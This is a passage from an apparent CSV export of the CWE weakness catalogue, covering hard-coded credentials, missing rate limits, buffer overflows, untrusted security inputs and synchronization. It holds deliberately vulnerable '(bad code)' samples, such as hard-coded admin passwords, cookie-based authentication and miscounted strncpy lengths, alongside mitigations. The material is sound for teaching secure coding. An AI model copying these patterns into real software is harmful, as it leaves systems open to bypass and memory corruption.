VerifyAdmin(char *password) {if (strcmp(password, ""Mew!"")) {printf(""Incorrect Password!\n"");return(0)}printf(""Entering Diagnostic Mode...\n"");return(1);}(bad code)Example Language:Javaint VerifyAdmin(String password) {if (!password.equals(""Mew!"")) {return(0)}//Diagnostic Modereturn(1);}Every instance of this program can be placed into diagnostic mode with the same password. Even worse is the fact that if this program is distributed as a binary-only distribution, it is very difficult to change that password or disable this ""functionality.""Example 3The following code examples attempt to verify a password using a hard-coded cryptographic key.(bad code)Example Language:Cint VerifyAdmin(char *password) {if (strcmp(password,""68af404b513073584c4b6f22b6c63e6b"")) {printf(""Incorrect Password!\n"");return(0);}printf(""Entering Diagnostic Mode...\n"");return(1);}(bad code)Example Language:Javapublic boolean VerifyAdmin(String password) {if (password.equals(""68af404b513073584c4b6f22b6c63e6b"")) {System.out.println(""Entering Diagnostic Mode..."");return true;}System.out.println(""Incorrect Password!"");return false;(bad code)Example Language:C#int VerifyAdmin(String password) {if (password.Equals(""68af404b513073584c4b6f22b6c63e6b"")) {Console.WriteLine(""Entering Diagnostic Mode..."");return(1);}Console.WriteLine(""Incorrect Password!"");return(0);}The cryptographic key is within a hard-coded string value that is compared to the password. It is likely that an attacker will be able to read the key and compromise the system.Example 4The following examples show a portion of properties and configuration files for Java and ASP.NET applications. The files include username and password information but they are stored in cleartext.This Java example shows a properties file with a cleartext username / password pair.(bad code)Example Language:Java# Java Web App ResourceBundle properties file...webapp.ldap.username=secretUsernamewebapp.ldap.password=secretPassword...The following example shows a portion of a configuration file for an ASP.Net application. This configuration file includes username and password information for a connection to a database but the pair is stored in cleartext.(bad code)Example Language:ASP.NET...<connectionStrings><add name=""ud_DEV"" connectionString=""connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;"" providerName=""System.Data.Odbc"" /></connectionStrings>...Username and password information should not be included in a configuration file or a properties file in cleartext as this will allow anyone who can read the file access to the resource. If possible, encrypt this information.Example 5In 2022, the OT:ICEFALL study examined products by 10 different Operational Technology (OT) vendors. The researchers reported 56 vulnerabilities and said that the products were ""insecure by design"" [REF-1283]. If exploited, these vulnerabilities often allowed adversaries to change how the products operated, ranging from denial of service to changing the code that the products executed. Since these products were often used in industries such as power, electrical, water, and others, there could even be safety implications.Multiple vendors used hard-coded credentials in their OT products.","Phase:  Architecture and DesignFor outbound authentication: store passwords, keys, and other credentials outside of the code in a strongly-protected, encrypted configuration file or database that is protected from access by all outsiders, including other local users on the same system. Properly protect the key (CWE-320). If you cannot use encryption to protect the file, then make sure that the permissions are as restrictive as possible [REF-7].In Windows environments, the Encrypted File System (EFS) may provide some protection.Phase:  Architecture and DesignFor inbound authentication: Rather than hard-code a default username and password, key, or other authentication credentials for first time logins, utilize a ""first login"" mode that requires the user to enter a unique strong password or key.Phase:  Architecture and DesignIf the product must contain hard-coded credentials or they cannot be removed, perform access control checks and limit which entities can access the feature that requires the hard-coded credentials. For example, a feature might only be enabled through the system console instead of through a network connection.Phase:  Architecture and DesignFor inbound authentication using passwords: apply strong one-way hashes to passwords and store those hashes in a configuration file or database with appropriate access control. That way, theft of the file/database still requires the attacker to try to crack the password. When handling an incoming password during authentication, take the hash of the password and compare it to the saved hash.Use randomly assigned salts for each separate hash that is generated. This increases the amount of computation that an attacker needs to conduct a brute-force attack, possibly limiting the effectiveness of the rainbow table method.Phase:  Architecture and DesignFor front-end to back-end connections: Three solutions are possible, although none are complete.The first suggestion involves the use of generated passwords or keys that are changed automatically and must be entered at given time intervals by a system administrator. These passwords will be held in memory and only be valid for the time intervals.Next, the passwords or keys should be limited at the back end to only performing actions valid for the front end, as opposed to having full access.Finally, the messages sent should be tagged and checksummed with time sensitive values so as to prevent replay-style attacks."
CWE-799: Improper Control of Interaction Frequency,"The product does not properly limit the number or frequency of interactions that it has with an actor, such as the number of incoming requests.","Scope: AvailabilityAccess ControlOther, Impact: Technical Impact:DoS: Resource Consumption (Other); Bypass Protection Mechanism; Other, Likelihood: ","Example 1In the following code a username and password is read from a socket and an attempt is made to authenticate the username and password. The code will continuously checked the socket for a username and password until it has been authenticated.(bad code)Example Language:Cchar username[USERNAME_SIZE];char password[PASSWORD_SIZE];while (isValidUser == 0) {if (getNextMessage(socket, username, USERNAME_SIZE) > 0) {if (getNextMessage(socket, password, PASSWORD_SIZE) > 0) {isValidUser = AuthenticateUser(username, password);}}}return(SUCCESS);This code does not place any restriction on the number of authentication attempts made. There should be a limit on the number of authentication attempts made to prevent brute force attacks as in the following example code.(good code)Example Language:Cint count = 0;while ((isValidUser == 0) && (count < MAX_ATTEMPTS)) {if (getNextMessage(socket, username, USERNAME_SIZE) > 0) {if (getNextMessage(socket, password, PASSWORD_SIZE) > 0) {isValidUser = AuthenticateUser(username, password);}}count++;}if (isValidUser) {return(SUCCESS);}else {return(FAIL);}",无可能的缓解方案
CWE VIEW: Weaknesses in the 2010 CWE/SANS Top 25 Most Dangerous Programming Errors,CWE entries in this view (graph) are listed in the 2010 CWE/SANS Top 25 Programming Errors. This view is considered obsolete as a newer version of the Top 25 is available.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: 2010 Top 25 - Insecure Interaction Between Components,"Weaknesses in this category are listed in the ""Insecure Interaction Between Components"" section of the 2010 CWE/SANS Top 25 Programming Errors.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: 2010 Top 25 - Risky Resource Management,"Weaknesses in this category are listed in the ""Risky Resource Management"" section of the 2010 CWE/SANS Top 25 Programming Errors.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: 2010 Top 25 - Porous Defenses,"Weaknesses in this category are listed in the ""Porous Defenses"" section of the 2010 CWE/SANS Top 25 Programming Errors.",无常见后果信息,无示范例子,无可能的缓解方案
CWE-804: Guessable CAPTCHA,"The product uses a CAPTCHA challenge, but the challenge can be guessed or automatically recognized by a non-human actor.","Scope: Access ControlOther, Impact: Technical Impact:Bypass Protection Mechanism; OtherWhen authorization, authentication, or another protection mechanism relies on CAPTCHA entities to ensure that only human actors can access certain functionality, then an automated attacker such as a bot may access the restricted functionality by guessing the CAPTCHA., Likelihood: ",无示范例子,无可能的缓解方案
CWE-805: Buffer Access with Incorrect Length Value,"The product uses a sequential operation to read or write a buffer, but it uses an incorrect length value that causes it to access memory that is outside of the bounds of the buffer.","Scope: IntegrityConfidentialityAvailability, Impact: Technical Impact:Read Memory; Modify Memory; Execute Unauthorized Code or CommandsBuffer overflows often can be used to execute arbitrary code, which is usually outside the scope of a program's implicit security policy. This can often be used to subvert any other security service., Likelihood: ; Scope: Availability, Impact: Technical Impact:Modify Memory; DoS: Crash, Exit, or Restart; DoS: Resource Consumption (CPU)Buffer overflows generally lead to crashes. Other attacks leading to lack of availability are possible, including putting the program into an infinite loop., Likelihood: ","Example 1This example takes an IP address from a user, verifies that it is well formed and then looks up the hostname and copies it into a buffer.(bad code)Example Language:Cvoid host_lookup(char *user_supplied_addr){struct hostent *hp;in_addr_t *addr;char hostname[64];in_addr_t inet_addr(const char *cp);/*routine that ensures user_supplied_addr is in the right format for conversion */validate_addr_form(user_supplied_addr);addr = inet_addr(user_supplied_addr);hp = gethostbyaddr( addr, sizeof(struct in_addr), AF_INET);strcpy(hostname, hp->h_name);}This function allocates a buffer of 64 bytes to store the hostname under the assumption that the maximum length value of hostname is 64 bytes, however there is no guarantee that the hostname will not be larger than 64 bytes. If an attacker specifies an address which resolves to a very large hostname, then the function may overwrite sensitive data or even relinquish control flow to the attacker.Note that this example also contains an unchecked return value (CWE-252) that can lead to a NULL pointer dereference (CWE-476).Example 2In the following example, it is possible to request that memcpy move a much larger segment of memory than assumed:(bad code)Example Language:Cint returnChunkSize(void *) {/* if chunk info is valid, return the size of usable memory,* else, return -1 to indicate an error*/...}int main() {...memcpy(destBuf, srcBuf, (returnChunkSize(destBuf)-1));...}If returnChunkSize() happens to encounter an error it will return -1. Notice that the return value is not checked before the memcpy operation (CWE-252), so -1 can be passed as the size argument to memcpy() (CWE-805). Because memcpy() assumes that the value is unsigned, it will be interpreted as MAXINT-1 (CWE-195), and therefore will copy far more memory than is likely available to the destination buffer (CWE-787,CWE-788).Example 3In the following example, the source character string is copied to the dest character string using the method strncpy.(bad code)Example Language:C...char source[21] = ""the character string"";char dest[12];strncpy(dest, source, sizeof(source)-1);...However, in the call to strncpy the source character string is used within the sizeof call to determine the number of characters to copy. This will create a buffer overflow as the size of the source character string is greater than the dest character string. The dest character string should be used within the sizeof call to ensure that the correct number of characters are copied, as shown below.(good code)Example Language:C...char source[21] = ""the character string"";char dest[12];strncpy(dest, source, sizeof(dest)-1);...Example 4In this example, the method outputFilenameToLog outputs a filename to a log file. The method arguments include a pointer to a character string containing the file name and an integer for the number of characters in the string. The filename is copied to a buffer where the buffer size is set to a maximum size for inputs to the log file. The method then calls another method to save the contents of the buffer to the log file.(bad code)Example Language:C#define LOG_INPUT_SIZE 40// saves the file name to a log fileint outputFilenameToLog(char *filename, int length) {int success;// buffer with size set to maximum size for input to log filechar buf[LOG_INPUT_SIZE];// copy filename to bufferstrncpy(buf, filename, length);// save to log filesuccess = saveToLogFile(buf);return success;}However, in this case the string copy method, strncpy, mistakenly uses the length method argument to determine the number of characters to copy rather than using the size of the local character string, buf. This can lead to a buffer overflow if the number of characters contained in character string pointed to by filename is larger then the number of characters allowed for the local character string. The string copy method should use the buf character string within a sizeof call to ensure that only characters up to the size of the buf array are copied to avoid a buffer overflow, as shown below.(good code)Example Language:C...// copy filename to bufferstrncpy(buf, filename, sizeof(buf)-1);...Example 5Windows provides the MultiByteToWideChar(), WideCharToMultiByte(), UnicodeToBytes(), and BytesToUnicode() functions to convert between arbitrary multibyte (usually ANSI) character strings and Unicode (wide character) strings. The size arguments to these functions are specified in different units, (one in bytes, the other in characters) making their use prone to error.In a multibyte character string, each character occupies a varying number of bytes, and therefore the size of such strings is most easily specified as a total number of bytes. In Unicode, however, characters are always a fixed size, and string lengths are typically given by the number of characters they contain. Mistakenly specifying the wrong units in a size argument can lead to a buffer overflow.The following function takes a username specified as a multibyte string and a pointer to a structure for user information and populates the structure with information about the specified user. Since Windows authentication uses Unicode for usernames, the username argument is first converted from a multibyte string to a Unicode string.(bad code)Example Language:Cvoid getUserInfo(char *username, struct _USER_INFO_2 info){WCHAR unicodeUser[UNLEN+1];MultiByteToWideChar(CP_ACP, 0, username, -1, unicodeUser, sizeof(unicodeUser));NetUserGetInfo(NULL, unicodeUser, 2, (LPBYTE *)&info);}This function incorrectly passes the size of unicodeUser in bytes instead of characters. The call to MultiByteToWideChar() can therefore write up to (UNLEN+1)*sizeof(WCHAR) wide characters, or (UNLEN+1)*sizeof(WCHAR)*sizeof(WCHAR) bytes, to the unicodeUser array, which has only (UNLEN+1)*sizeof(WCHAR) bytes allocated.If the username string contains more than UNLEN characters, the call to MultiByteToWideChar() will overflow the buffer unicodeUser.","Phase:  RequirementsStrategy:  Language SelectionUse a language that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.For example, many languages that perform their own memory management, such as Java and Perl, are not subject to buffer overflows. Other languages, such as Ada and C#, typically provide overflow protection, but the protection can be disabled by the programmer.Be wary that a language's interface to native code may still be subject to overflows, even if the language itself is theoretically safe.Phase:  Architecture and DesignStrategy:  Libraries or FrameworksUse a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.Examples include the Safe C String Library (SafeStr) by Messier and Viega [REF-57], and the Strsafe.h library from Microsoft [REF-56]. These libraries provide safer versions of overflow-prone string-handling functions.Note:This is not a complete solution, since many buffer overflows are not related to strings.Phases:  Operation; Build and CompilationStrategy:  Environment HardeningUse automatic buffer overflow detection mechanisms that are offered by certain compilers or compiler extensions. Examples include: the Microsoft Visual Studio /GS flag, Fedora/Red Hat FORTIFY_SOURCE GCC flag, StackGuard, and ProPolice, which provide various mechanisms including canary-based detection and range/index checking.D3-SFCV (Stack Frame Canary Validation) from D3FEND [REF-1334] discusses canary-based detection in detail.Effectiveness: Defense in DepthNote:This is not necessarily a complete solution, since these mechanisms only detect certain types of overflows. In addition, the result is still a denial of service, since the typical response is to exit the application.Phase:  ImplementationConsider adhering to the following rules when allocating and managing an application's memory:Double check that the buffer is as large as specified.When using functions that accept a number of bytes to copy, such as strncpy(), be aware that if the destination buffer size is equal to the source buffer size, it may not NULL-terminate the string.Check buffer boundaries if accessing the buffer in a loop and make sure there is no danger of writing past the allocated space.If necessary, truncate all input strings to a reasonable length before passing them to the copy and concatenation functions.Phase:  Architecture and DesignFor any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoidCWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.Phases:  Operation; Build and CompilationStrategy:  Environment HardeningRun or compile the software using features or extensions that randomly arrange the positions of a program's executable and libraries in memory. Because this makes the addresses unpredictable, it can prevent an attacker from reliably jumping to exploitable code.Examples include Address Space Layout Randomization (ASLR) [REF-58] [REF-60] and Position-Independent Executables (PIE) [REF-64]. Imported modules may be similarly realigned if their default memory addresses conflict with other modules, in a process known as ""rebasing"" (for Windows) and ""prelinking"" (for Linux) [REF-1332] using randomly generated addresses. ASLR for libraries cannot be used in conjunction with prelink since it would require relocating the libraries at run-time, defeating the whole purpose of prelinking.For more information on these techniques see D3-SAOR (Segment Address Offset Randomization) from D3FEND [REF-1335].Effectiveness: Defense in DepthNote:These techniques do not provide a complete solution. For instance, exploits frequently use a bug that discloses memory addresses in order to maximize reliability of code execution [REF-1337]. It has also been shown that a side-channel attack can bypass ASLR [REF-1333]Phase:  OperationStrategy:  Environment HardeningUse a CPU and operating system that offers Data Execution Protection (using hardware NX or XD bits) or the equivalent techniques that simulate this feature in software, such as PaX [REF-60] [REF-61]. These techniques ensure that any instruction executed is exclusively at a memory address that is part of the code segment.For more information on these techniques see D3-PSEP (Process Segment Execution Prevention) from D3FEND [REF-1336].Effectiveness: Defense in DepthNote:This is not a complete solution, since buffer overflows could be used to overwrite nearby variables to modify the software's state in dangerous ways. In addition, it cannot be used in cases in which self-modifying code is required. Finally, an attack could still cause a denial of service, since the typical response is to exit the application.Phases:  Architecture and Design; OperationStrategy:  Environment HardeningRun your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the product or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.Phases:  Architecture and Design; OperationStrategy:  Sandbox or JailRun the code in a ""jail"" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.Be careful to avoidCWE-243and other weaknesses related to jails.Effectiveness: LimitedNote:The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed."
CWE-806: Buffer Access Using Size of Source Buffer,"The product uses the size of a source buffer when reading from or writing to a destination buffer, which may cause it to access memory that is outside of the bounds of the buffer.","Scope: Availability, Impact: Technical Impact:Modify Memory; DoS: Crash, Exit, or Restart; DoS: Resource Consumption (CPU)Buffer overflows generally lead to crashes. Other attacks leading to lack of availability are possible, including putting the program into an infinite loop., Likelihood: ; Scope: IntegrityConfidentialityAvailability, Impact: Technical Impact:Read Memory; Modify Memory; Execute Unauthorized Code or CommandsBuffer overflows often can be used to execute arbitrary code, which is usually outside the scope of a program's implicit security policy., Likelihood: ; Scope: Access Control, Impact: Technical Impact:Bypass Protection MechanismWhen the consequence is arbitrary code execution, this can often be used to subvert any other security service., Likelihood: ","Example 1In the following example, the source character string is copied to the dest character string using the method strncpy.(bad code)Example Language:C...char source[21] = ""the character string"";char dest[12];strncpy(dest, source, sizeof(source)-1);...However, in the call to strncpy the source character string is used within the sizeof call to determine the number of characters to copy. This will create a buffer overflow as the size of the source character string is greater than the dest character string. The dest character string should be used within the sizeof call to ensure that the correct number of characters are copied, as shown below.(good code)Example Language:C...char source[21] = ""the character string"";char dest[12];strncpy(dest, source, sizeof(dest)-1);...Example 2In this example, the method outputFilenameToLog outputs a filename to a log file. The method arguments include a pointer to a character string containing the file name and an integer for the number of characters in the string. The filename is copied to a buffer where the buffer size is set to a maximum size for inputs to the log file. The method then calls another method to save the contents of the buffer to the log file.(bad code)Example Language:C#define LOG_INPUT_SIZE 40// saves the file name to a log fileint outputFilenameToLog(char *filename, int length) {int success;// buffer with size set to maximum size for input to log filechar buf[LOG_INPUT_SIZE];// copy filename to bufferstrncpy(buf, filename, length);// save to log filesuccess = saveToLogFile(buf);return success;}However, in this case the string copy method, strncpy, mistakenly uses the length method argument to determine the number of characters to copy rather than using the size of the local character string, buf. This can lead to a buffer overflow if the number of characters contained in character string pointed to by filename is larger then the number of characters allowed for the local character string. The string copy method should use the buf character string within a sizeof call to ensure that only characters up to the size of the buf array are copied to avoid a buffer overflow, as shown below.(good code)Example Language:C...// copy filename to bufferstrncpy(buf, filename, sizeof(buf)-1);...","Phase:  Architecture and DesignUse an abstraction library to abstract away risky APIs. Examples include the Safe C String Library (SafeStr) by Viega, and the Strsafe.h library from Microsoft. This is not a complete solution, since many buffer overflows are not related to strings.Phases:  Operation; Build and CompilationStrategy:  Environment HardeningUse automatic buffer overflow detection mechanisms that are offered by certain compilers or compiler extensions. Examples include: the Microsoft Visual Studio /GS flag, Fedora/Red Hat FORTIFY_SOURCE GCC flag, StackGuard, and ProPolice, which provide various mechanisms including canary-based detection and range/index checking.D3-SFCV (Stack Frame Canary Validation) from D3FEND [REF-1334] discusses canary-based detection in detail.Effectiveness: Defense in DepthNote:This is not necessarily a complete solution, since these mechanisms only detect certain types of overflows. In addition, the result is still a denial of service, since the typical response is to exit the application.Phase:  ImplementationProgrammers should adhere to the following rules when allocating and managing their applications memory: Double check that your buffer is as large as you specify. When using functions that accept a number of bytes to copy, such as strncpy(), be aware that if the destination buffer size is equal to the source buffer size, it may not NULL-terminate the string. Check buffer boundaries if calling this function in a loop and make sure there is no danger of writing past the allocated space. Truncate all input strings to a reasonable length before passing them to the copy and concatenation functionsPhases:  Operation; Build and CompilationStrategy:  Environment HardeningRun or compile the software using features or extensions that randomly arrange the positions of a program's executable and libraries in memory. Because this makes the addresses unpredictable, it can prevent an attacker from reliably jumping to exploitable code.Examples include Address Space Layout Randomization (ASLR) [REF-58] [REF-60] and Position-Independent Executables (PIE) [REF-64]. Imported modules may be similarly realigned if their default memory addresses conflict with other modules, in a process known as ""rebasing"" (for Windows) and ""prelinking"" (for Linux) [REF-1332] using randomly generated addresses. ASLR for libraries cannot be used in conjunction with prelink since it would require relocating the libraries at run-time, defeating the whole purpose of prelinking.For more information on these techniques see D3-SAOR (Segment Address Offset Randomization) from D3FEND [REF-1335].Effectiveness: Defense in DepthNote:These techniques do not provide a complete solution. For instance, exploits frequently use a bug that discloses memory addresses in order to maximize reliability of code execution [REF-1337]. It has also been shown that a side-channel attack can bypass ASLR [REF-1333]Phase:  OperationStrategy:  Environment HardeningUse a CPU and operating system that offers Data Execution Protection (using hardware NX or XD bits) or the equivalent techniques that simulate this feature in software, such as PaX [REF-60] [REF-61]. These techniques ensure that any instruction executed is exclusively at a memory address that is part of the code segment.For more information on these techniques see D3-PSEP (Process Segment Execution Prevention) from D3FEND [REF-1336].Effectiveness: Defense in DepthNote:This is not a complete solution, since buffer overflows could be used to overwrite nearby variables to modify the software's state in dangerous ways. In addition, it cannot be used in cases in which self-modifying code is required. Finally, an attack could still cause a denial of service, since the typical response is to exit the application.Phases:  Build and Compilation; OperationMost mitigating technologies at the compiler or OS level to date address only a subset of buffer overflow problems and rarely provide complete protection against even that subset. It is good practice to implement strategies to increase the workload of an attacker, such as leaving the attacker to guess an unknown value that changes every program execution."
CWE-807: Reliance on Untrusted Inputs in a Security Decision,"The product uses a protection mechanism that relies on the existence or values of an input, but the input can be modified by an untrusted actor in a way that bypasses the protection mechanism.","Scope: ConfidentialityAccess ControlAvailabilityOther, Impact: Technical Impact:Bypass Protection Mechanism; Gain Privileges or Assume Identity; Varies by ContextAttackers can bypass the security decision to access whatever is being protected. The consequences will depend on the associated functionality, but they can range from granting additional privileges to untrusted users to bypassing important security checks. Ultimately, this weakness may lead to exposure or modification of sensitive data, system crash, or execution of arbitrary code., Likelihood: ","Example 1The following code excerpt reads a value from a browser cookie to determine the role of the user.(bad code)Example Language:JavaCookie[] cookies = request.getCookies();for (int i =0; i< cookies.length; i++) {Cookie c = cookies[i];if (c.getName().equals(""role"")) {userRole = c.getValue();}}Example 2The following code could be for a medical records application. It performs authentication by checking if a cookie has been set.(bad code)Example Language:PHP$auth = $_COOKIES['authenticated'];if (! $auth) {if (AuthenticateUser($_POST['user'], $_POST['password']) == ""success"") {// save the cookie to send out in future responsessetcookie(""authenticated"", ""1"", time()+60*60*2);}else {ShowLoginScreen();die(""\n"");}}DisplayMedicalHistory($_POST['patient_ID']);The programmer expects that the AuthenticateUser() check will always be applied, and the ""authenticated"" cookie will only be set when authentication succeeds. The programmer even diligently specifies a 2-hour expiration for the cookie.However, the attacker can set the ""authenticated"" cookie to a non-zero value such as 1. As a result, the $auth variable is 1, and the AuthenticateUser() check is not even performed. The attacker has bypassed the authentication.Example 3In the following example, an authentication flag is read from a browser cookie, thus allowing for external control of user state data.(bad code)Example Language:JavaCookie[] cookies = request.getCookies();for (int i =0; i< cookies.length; i++) {Cookie c = cookies[i];if (c.getName().equals(""authenticated"") && Boolean.TRUE.equals(c.getValue())) {authenticated = true;}}Example 4The following code samples use a DNS lookup in order to decide whether or not an inbound request is from a trusted host. If an attacker can poison the DNS cache, they can gain trusted status.(bad code)Example Language:Cstruct hostent *hp;struct in_addr myaddr;char* tHost = ""trustme.example.com"";myaddr.s_addr=inet_addr(ip_addr_string);hp = gethostbyaddr((char *) &myaddr, sizeof(struct in_addr), AF_INET);if (hp && !strncmp(hp->h_name, tHost, sizeof(tHost))) {trusted = true;} else {trusted = false;}(bad code)Example Language:JavaString ip = request.getRemoteAddr();InetAddress addr = InetAddress.getByName(ip);if (addr.getCanonicalHostName().endsWith(""trustme.com"")) {trusted = true;}(bad code)Example Language:C#IPAddress hostIPAddress = IPAddress.Parse(RemoteIpAddress);IPHostEntry hostInfo = Dns.GetHostByAddress(hostIPAddress);if (hostInfo.HostName.EndsWith(""trustme.com"")) {trusted = true;}IP addresses are more reliable than DNS names, but they can also be spoofed. Attackers can easily forge the source IP address of the packets they send, but response packets will return to the forged IP address. To see the response packets, the attacker has to sniff the traffic between the victim machine and the forged IP address. In order to accomplish the required sniffing, attackers typically attempt to locate themselves on the same subnet as the victim machine. Attackers may be able to circumvent this requirement by using source routing, but source routing is disabled across much of the Internet today. In summary, IP address verification can be a useful part of an authentication scheme, but it should not be the single factor required for authentication.","Phase:  Architecture and DesignStrategy:  Attack Surface ReductionStore state information and sensitive data on the server side only.Ensure that the system definitively and unambiguously keeps track of its own state and user state and has rules defined for legitimate state transitions. Do not allow any application user to affect state directly in any way other than through legitimate actions leading to state transitions.If information must be stored on the client, do not do so without encryption and integrity checking, or otherwise having a mechanism on the server side to catch tampering. Use a message authentication code (MAC) algorithm, such as Hash Message Authentication Code (HMAC) [REF-529]. Apply this against the state or sensitive data that has to be exposed, which can guarantee the integrity of the data - i.e., that the data has not been modified. Ensure that a strong hash function is used (CWE-328).Phase:  Architecture and DesignStrategy:  Libraries or FrameworksUse a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.With a stateless protocol such as HTTP, use a framework that maintains the state for you.Examples include ASP.NET View State [REF-756] and the OWASP ESAPI Session Management feature [REF-45].Be careful of language features that provide state support, since these might be provided as a convenience to the programmer and may not be considering security.Phase:  Architecture and DesignFor any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoidCWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.Phases:  Operation; ImplementationStrategy:  Environment HardeningWhen using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such asCWE-95,CWE-621, and similar issues.Phases:  Architecture and Design; ImplementationStrategy:  Attack Surface ReductionUnderstand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.Identify all inputs that are used for security decisions and determine if you can modify the design so that you do not have to rely on submitted inputs at all. For example, you may be able to keep critical information about the user's session on the server side instead of recording it within external data."
CWE CATEGORY: 2010 Top 25 - Weaknesses On the Cusp,"Weaknesses in this category are not part of the general Top 25, but they were part of the original nominee list from which the Top 25 was drawn.",无常见后果信息,无示范例子,无可能的缓解方案
CWE VIEW: Weaknesses in OWASP Top Ten (2010),"CWE nodes in this view (graph) are associated with the OWASP Top Ten, as released in 2010. This view is considered obsolete as a newer version of the OWASP Top Ten is available.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: OWASP Top Ten 2010 Category A1 - Injection,Weaknesses in this category are related to the A1 category in the OWASP Top Ten 2010.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: OWASP Top Ten 2010 Category A2 - Cross-Site Scripting (XSS),Weaknesses in this category are related to the A2 category in the OWASP Top Ten 2010.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: OWASP Top Ten 2010 Category A3 - Broken Authentication and Session Management,Weaknesses in this category are related to the A3 category in the OWASP Top Ten 2010.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: OWASP Top Ten 2010 Category A4 - Insecure Direct Object References,Weaknesses in this category are related to the A4 category in the OWASP Top Ten 2010.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: OWASP Top Ten 2010 Category A5 - Cross-Site Request Forgery(CSRF),Weaknesses in this category are related to the A5 category in the OWASP Top Ten 2010.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: OWASP Top Ten 2010 Category A6 - Security Misconfiguration,Weaknesses in this category are related to the A6 category in the OWASP Top Ten 2010.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: OWASP Top Ten 2010 Category A7 - Insecure Cryptographic Storage,Weaknesses in this category are related to the A7 category in the OWASP Top Ten 2010.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: OWASP Top Ten 2010 Category A8 - Failure to Restrict URL Access,Weaknesses in this category are related to the A8 category in the OWASP Top Ten 2010.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: OWASP Top Ten 2010 Category A9 - Insufficient Transport Layer Protection,Weaknesses in this category are related to the A9 category in the OWASP Top Ten 2010.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: OWASP Top Ten 2010 Category A10 - Unvalidated Redirects and Forwards,Weaknesses in this category are related to the A10 category in the OWASP Top Ten 2010.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-820: Missing Synchronization,The product utilizes a shared resource in a concurrent manner but does not attempt to synchronize access to the resource.,"Scope: IntegrityConfidentialityOther, Impact: Technical Impact:Modify Application Data; Read Application Data; Alter Execution Logic, Likelihood: ","Example 1The following code intends to fork a process, then have both the parent and child processes print a single line.(bad code)Example Language:Cstatic void print (char * string) {char * word;int counter;for (word = string; counter = *word++; ) {putc(counter, stdout);fflush(stdout);/* Make timing window a little larger... */sleep(1);}}int main(void) {pid_t pid;pid = fork();if (pid == -1) {exit(-2);}else if (pid == 0) {print(""child\n"");}else {print(""PARENT\n"");}exit(0);}One might expect the code to print out something like:PARENTchildHowever, because the parent and child are executing concurrently, and stdout is flushed each time a character is printed, the output might be mixed together, such as:PcAhRiElNdT[blank line][blank line]",无可能的缓解方案
CWE-821: Incorrect Synchronization,"The product utilizes a shared resource in a concurrent manner, but it does not correctly synchronize access to the resource.","Scope: IntegrityConfidentialityOther, Impact: Technical Impact:Modify Application Data; Read Application Data; Alter Execution Logic, Likelihood: ",无示范例子,无可能的缓解方案
CWE-822: Untrusted Pointer Dereference,"The product obtains a value from an untrusted source, converts this value to a pointer, and dereferences the resulting pointer.","Scope: Confidentiality, Impact: Technical Impact:Read MemoryIf the untrusted pointer is used in a read operation, an attacker might be able to read sensitive portions of memory., Likelihood: ; Scope: Availability, Impact: Technical Impact:DoS: Crash, Exit, or RestartIf the untrusted pointer references a memory location that is not accessible to the product, or points to a location that is ""malformed"" or larger than expected by a read or write operation, the application may terminate unexpectedly., Likelihood: ; Scope: IntegrityConfidentialityAvailability, Impact: Technical Impact:Execute Unauthorized Code or Commands; Modify MemoryIf the untrusted pointer is used in a function call, or points to unexpected data in a write operation, then code execution may be possible., Likelihood: ",无示范例子,无可能的缓解方案
